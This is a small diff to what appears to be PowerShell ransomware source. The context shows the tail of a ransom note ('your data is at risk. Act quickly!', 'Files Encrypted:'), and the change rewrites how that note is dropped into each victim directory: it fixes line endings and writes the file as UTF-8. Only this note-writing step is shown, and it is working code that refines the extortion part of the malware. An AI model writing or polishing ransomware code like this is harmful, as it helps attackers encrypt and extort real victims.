@@ -597,9 +597,10 @@ Don't waste time, your data is at risk. Act quickly!"
 
 D. Files Encrypted:
 "@
-    $ReadmeTXT = $ReadmeTXT.Replace("`n", "`r`n")
     if (!(Test-Path "$Directory$slash$Readme")) {
-        Add-Content -Path "$Directory$slash$Readme" -Value $ReadmeTXT
+        $ReadmeTXT = $ReadmeTXT -replace "`r`n", "`n"
+        $ReadmeTXT = $ReadmeTXT -replace "`n", "`r`n"
+        [System.IO.File]::WriteAllText("$Directory$slash$Readme", $ReadmeTXT, [System.Text.Encoding]::UTF8)
     }
 }
 
